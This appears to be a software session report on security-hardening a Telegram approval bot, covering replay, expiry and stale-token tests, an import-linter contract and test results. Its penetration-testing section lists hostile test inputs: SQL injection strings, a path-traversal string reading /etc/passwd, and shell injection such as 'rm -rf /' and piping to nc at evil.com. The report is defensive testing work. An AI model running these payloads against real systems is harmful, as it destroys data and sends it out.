# Phase 9 — Session 07 Report: Security Hardening, Edge Cases & Import Linter

- **Session:** `S07` (`docs/implementation/phase-9-sessions/phase-09-sessions.md` §Session 07, `docs/implementation/phases/phase-09-owner-channel.md` `P9-05`, `AC-4`)
- **Date:** 2026-11-04
- **Status:** `complete` (Dedicated security and penetration test suite with 100% pass rate, architectural import linter enforcement for AC-4, and full regression verification)
- **Branch / Commit Baseline:** `main` at `bf8ffda` + Sessions 01–06 foundation
- **Alembic Migration Head:** `20261104_0041_action_tokens.py` (revision `0041`, down_revision `0040`, 69 database tables total)

---

## 1. Summary of Implemented Artifacts & Contracts

| Artifact / File | Status | Implementation Summary |
|---|---|---|
| `backend/tests/security/test_owner_channel_security.py` | **Created** | Comprehensive 12-test security and resilience suite covering: forwarded buttons pressed by wrong user (Case 1), replayed tokens (Case 2), expired approval buttons (Case 3), edited subjects / stale payload hashes (Case 4), unlinked user interactions (Case 5), duplicate update delivery deduplication (Case 6), oversized media uploads > 20 MB (Case 7), quiet hours enforcement & critical alert bypass (Case 8), SQL injection attempts in `/link`, malformed callback query data resilience, shell command injection heuristics, and cross-workspace token isolation. |
| `backend/pyproject.toml` | **Updated** | Added architectural import linter contract `only channel registry and telegram webhook router import telegram channel adapter (AC-4)` forbidding `app.commands`, `app.approvals`, `app.inbox`, `app.policy`, `app.identity`, `app.knowledge`, `app.core`, `app.audit`, `app.jobs`, `app.ai`, `app.notifications`, `app.operations`, `app.content`, `app.reporting`, `app.activity`, and `app.retention` from directly importing `app.integrations.channels.telegram`. Verified with `lint-imports` (20 contracts kept, 0 broken). |
| `docs/implementation/phase-9-sessions/s07-report.md` | **Created** | This report documenting security test execution, import linter validation, quality checks, and handoff to Session 08. |

---

## 2. Security Test Matrix & Invariant Verification

The dedicated security suite in `backend/tests/security/test_owner_channel_security.py` verifies all 8 canonical edge cases from P9-05 plus penetration vectors:

### 2.1 Case 1: Wrong User Pressing Forwarded Button (`INV-16`, `ADR-014`)
- **Scenario:** User A receives an approval request with inline buttons. A third party or different workspace member (User B) receives a forwarded copy and taps the button.
- **Verification:**
  - `ActionTokenService.consume_action_token` verifies that the resolving channel user matches the token's bound `user_id`.
  - On mismatch, raises `FORBIDDEN` (`user_mismatch`).
  - Webhook returns `action="approval_unauthorized"` and delivers a modal alert (`show_alert=True`, *"Bu onay için yetkiniz yok / Unauthorized"*).
  - The token's `used_at` remains `NULL`; the approval and reply draft remain `pending`.
  - Zero side effects: zero jobs enqueued, zero customer messages sent.

### 2.2 Case 2: Replayed Button Concurrency & Replay Protection (`INV-06`, `INV-16`, `AC-1`)
- **Scenario:** An owner taps the approve button twice sequentially or concurrently, or taps the reject button after already approving.
- **Verification:**
  - First button tap consumes the token atomically (`used_at = clock.now()`), executes `ApprovalService.decide`, transitions draft to `queued`, and enqueues a single `send_reply` job.
  - Second button tap (replaying the same token) detects `used_at IS NOT NULL` and raises `APPROVAL_ALREADY_DECIDED`.
  - Third button tap (using the sibling reject token) detects `approval.status == 'approved'` and raises `APPROVAL_ALREADY_DECIDED`.
  - Both replays display modal alert *"Bu onay zaten karara bağlandı / Already decided"* (`show_alert=True`) and strip inline buttons.
  - Invariant guarantee: exactly 1 job in the queue, zero duplicate execution (INV-06, AC-1).

### 2.3 Case 3: Expired Approval Protection (`INV-16`, `ADR-014`)
- **Scenario:** An approval window passes its `expires_at` instant; the owner subsequently taps the approve button.
- **Verification:**
  - `ActionTokenService.consume_action_token` checks `token_record.expires_at <= clock.now()`, raising `APPROVAL_EXPIRED`.
  - Webhook displays modal alert *"Onay süresi doldu / Approval expired"* (`show_alert=True`) and removes keyboard buttons via `editMessageReplyMarkup`.
  - Returns `action="approval_expired"`; approval remains undecided; zero side effects dispatched.

### 2.4 Case 4: Edited Subject / Stale Approval (`INV-16`, `ADR-014`)
- **Scenario:** An operator edits the reply draft on the web app (e.g., updates text and advances `version` to 2); the owner attempts to decide using an older Telegram button.
- **Verification:**
  - `ApprovalService.decide` verifies `payload_hash` from the action token against the freshly computed hash of the subject entity.
  - Mismatch detected; raises `APPROVAL_STALE`.
  - Webhook displays modal alert *"Onay içeriği değişti / Approval stale"* (`show_alert=True`) and removes keyboard buttons.
  - Draft remains `pending_approval`; zero send jobs enqueued.

### 2.5 Case 5: Unlinked User Interaction Protection (`INV-03`, `INV-19`)
- **Scenario:** An unlinked external Telegram user sends chat messages, commands, or forged callback data.
- **Verification:**
  - Plain chat text: returns `unlinked_prompt` with instructions to use `/link <CODE>`.
  - `/status` command: returns account status explaining account is not linked.
  - Unknown slash commands (e.g., `/admin_eval_script`): returns `unlinked_prompt`.
  - Forged callback data (`act:forged_token_123`): returns `approval_failed` with toast error.
  - Zero business logic executed; zero tenant data leaked; zero rows created in jobs or customer tables.

### 2.6 Case 6: Duplicate Update Delivery Deduplication (`INV-06`)
- **Scenario:** Telegram sends the identical `update_id` 3 times in rapid succession.
- **Verification:**
  - Delivery 1: processed successfully, creates row in `telegram_updates`. Exactly 1 message sent by bot.
  - Deliveries 2 and 3: caught by deduplication check on `telegram_updates.update_id`; returns `status="duplicate"`, `action="duplicate"`.
  - Total outbound Telegram API calls across all 3 deliveries: strictly 1.
  - Database contains strictly 1 record for that `update_id`.

### 2.7 Case 7: Oversized Media Upload Protection (`INV-11`)
- **Scenario:** Linked owner uploads a photo > 20 MB (e.g., 25 MB).
- **Verification:**
  - Evaluated on photo metadata (`file_size > 20 MB`) before storage intake.
  - Returns `action="photo_rejected_size"` with message *"❌ Fotoğraf 20 MB'tan büyük olamaz."*.
  - Fast-fails before calling `getFile` or downloading photo bytes over network.
  - Records audit log entry `media.rejected` with `reason="too_large"` and exact byte size.
  - Media storage invariant: 0 `MediaAsset` rows created in database.

### 2.8 Case 8: Quiet Hours Enforcement & Critical Alert Bypass (`ADR-012`, Phase 9)
- **Scenario:** Recipient in `Europe/Istanbul` (UTC+3) with default quiet hours (22:00 to 08:00 local time).
- **Verification:**
  - At 23:30 local time (inside quiet window):
    - Non-critical report (`report.daily_ready`): suppressed (`status="skipped_quiet_hours"`).
    - Operational warning (`conversation.needs_human`): suppressed (`status="skipped_quiet_hours"`).
    - Critical alert (`system.integration_error`): immediately delivered (`status="pending"`, `bypassed_quiet_hours=True`, `reason="quiet_hours_bypassed:critical_severity"`).
    - Account reauth required (`account.needs_reauth`): immediately delivered (`bypassed_quiet_hours=True`).
    - Urgent approval expiring in 45 minutes (< 2 hours threshold): immediately delivered (`reason="quiet_hours_bypassed:approval_expiring_soon"`).
  - At 14:00 local time (active daytime): all notifications deliver normally (`is_quiet_hours=False`).

### 2.9 Penetration & Injection Testing
- **SQL Injection in `/link <code>`:** Malicious payloads (`'; DROP TABLE channel_links; --`, `' OR '1'='1`, `UNION SELECT`) safely handled by parameterized queries. Returns `link_failed_LINK_CODE_INVALID`, leaving tables intact.
- **Malformed Callback Data:** Empty tokens (`act:`), path traversal (`act:../../../../etc/passwd`), oversized buffers (`act:A*8192`), and arbitrary strings handled cleanly without crashing or exposing stack traces.
- **Command Injection Heuristics:** Shell metacharacters (`$(whoami)`, `; rm -rf /`, `| nc evil.com`) ingested safely as plain text; never passed to shell or subshell.
- **Cross-Workspace Isolation:** Tokens generated in Workspace A cannot be decided by users in Workspace B; rejected as unauthorized (`INV-19`).

---

## 3. Architectural Import Linter Enforcement (AC-4)

Under `backend/pyproject.toml`, added the following contract:

```toml
[[tool.importlinter.contracts]]
name = "only channel registry and telegram webhook router import telegram channel adapter (AC-4)"
type = "forbidden"
source_modules = [
    "app.commands",
    "app.approvals",
    "app.inbox",
    "app.policy",
    "app.identity",
    "app.knowledge",
    "app.core",
    "app.audit",
    "app.jobs",
    "app.ai",
    "app.notifications",
    "app.operations",
    "app.content",
    "app.reporting",
    "app.activity",
    "app.retention",
]
forbidden_modules = ["app.integrations.channels.telegram"]
allow_indirect_imports = true
```

Output of `uv run --directory backend lint-imports`:
```text
=============
Import Linter
=============

---------
Contracts
---------

Analyzed 383 files, 3222 dependencies.
--------------------------------------
...
only channel registry and telegram webhook router import telegram channel adapter (AC-4) KEPT

Contracts: 20 kept, 0 broken.
```

---

## 4. Verification Outcomes

### 4.1 Static Analysis & Quality
| Check | Command | Exit Code | Result Summary |
|---|---|---|---|
| Backend Lint | `uv run --directory backend ruff check .` | `0` | All checks passed cleanly across 615 files |
| Backend Formatting | `uv run --directory backend ruff format --check .` | `0` | 615 files verified formatted |
| Backend Typecheck | `uv run --directory backend mypy app` | `0` | Success: no issues found in 320 source files |
| Import Architecture | `uv run --directory backend lint-imports` | `0` | 20 contracts kept, 0 broken |

### 4.2 Test Suite Execution
| Test Suite | Command | Exit Code | Passing Count |
|---|---|---|---|
| Dedicated Security Suite | `uv run --directory backend pytest tests/security/test_owner_channel_security.py -v` | `0` | **12 passed** in 5.60s |
| Complete Channel Regression | `uv run --directory backend pytest tests/unit/identity/test_channel_links.py tests/contract/test_telegram_adapter.py tests/unit/notifications/test_delivery_policy.py tests/unit/integrations/channels/test_telegram_commands_media.py tests/unit/approvals/test_telegram_action_tokens.py tests/security/test_owner_channel_security.py -v` | `0` | **62 passed** in 11.72s |

---

## 5. Next Session Handoff (Session 08)

Session 07 has established complete security hardening and structural import isolation. Session 08 can now proceed to:
1. **Canonical Acceptance Criteria Verification:**
   - **AC-1:** Approval requested for reply draft approved via button; second press reports "already decided".
   - **AC-2:** "Bugün kaç DM geldi?" returns matching daily summary counts.
   - **AC-3:** Photo with caption creates story draft with media and requires approval.
   - **AC-4:** Architectural import isolation verified (20 contracts kept).
2. **Live Bot Harness (`tests/contract/test_telegram_live.py`):**
   - Live probe harness gated behind `@pytest.mark.telegram_live`.
3. **Phase Close-Out & Documentation:**
   - Update `docs/architecture/integrations.md §5`.
   - Update `docs/operations/local-development.md`.
   - Author `docs/implementation/phase-summaries/phase-09-summary.md`.
   - Update `roadmap.md` and `task-breakdown.md`.
